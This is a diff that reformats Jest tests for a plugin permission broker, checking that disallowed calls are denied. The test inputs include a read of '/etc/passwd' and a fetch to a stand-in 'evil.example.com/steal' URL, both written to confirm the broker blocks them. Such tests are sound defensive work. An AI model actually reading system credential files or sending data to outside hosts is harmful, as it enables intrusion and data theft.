@@ -1,7 +1,9 @@
 "use strict";
 
 jest.mock("../db/pool", () => ({ query: jest.fn() }));
-jest.mock("../services/notificationService", () => ({ createNotification: jest.fn().mockResolvedValue({}) }));
+jest.mock("../services/notificationService", () => ({
+  createNotification: jest.fn().mockResolvedValue({}),
+}));
 
 const pool = require("../db/pool");
 const { createBroker, BrokerDeniedError } = require("./broker");
@@ -25,15 +27,31 @@ describe("plugin broker — permission enforcement", () => {
   });
 
   test("NEGATIVE: rejects an unrecognized method outright", async () => {
-    const call = createBroker({ pluginId: "p1", pluginName: "P1", grantedScopes: ["read:jobs", "read:applications", "read:profile", "write:notifications", "network:api.example.com"] });
-    await expect(call("fs.readFile", { path: "/etc/passwd" })).rejects.toBeInstanceOf(BrokerDeniedError);
+    const call = createBroker({
+      pluginId: "p1",
+      pluginName: "P1",
+      grantedScopes: [
+        "read:jobs",
+        "read:applications",
+        "read:profile",
+        "write:notifications",
+        "network:api.example.com",
+      ],
+    });
+    await expect(call("fs.readFile", { path: "/etc/passwd" })).rejects.toBeInstanceOf(
+      BrokerDeniedError
+    );
   });
 
   test("network.fetch is denied without a matching network:<host> grant", async () => {
-    const call = createBroker({ pluginId: "p1", pluginName: "P1", grantedScopes: ["network:allowed.example.com"] });
-    await expect(call("network.fetch", { url: "https://evil.example.com/steal" })).rejects.toBeInstanceOf(
-      BrokerDeniedError
-    );
+    const call = createBroker({
+      pluginId: "p1",
+      pluginName: "P1",
+      grantedScopes: ["network:allowed.example.com"],
+    });
+    await expect(
+      call("network.fetch", { url: "https://evil.example.com/steal" })
+    ).rejects.toBeInstanceOf(BrokerDeniedError);
   });
 
   test("write:notifications is required for notifications.send", async () => {
@@ -42,7 +60,11 @@ describe("plugin broker — permission enforcement", () => {
       denied("notifications.send", { recipientAddress: "GABC", message: "hi" })
     ).rejects.toBeInstanceOf(BrokerDeniedError);
 
-    const allowed = createBroker({ pluginId: "p1", pluginName: "P1", grantedScopes: ["write:notifications"] });
+    const allowed = createBroker({
+      pluginId: "p1",
+      pluginName: "P1",
+      grantedScopes: ["write:notifications"],
+    });
     const result = await allowed("notifications.send", { recipientAddress: "GABC", message: "hi" });
     expect(result).toEqual({ sent: true });
   });
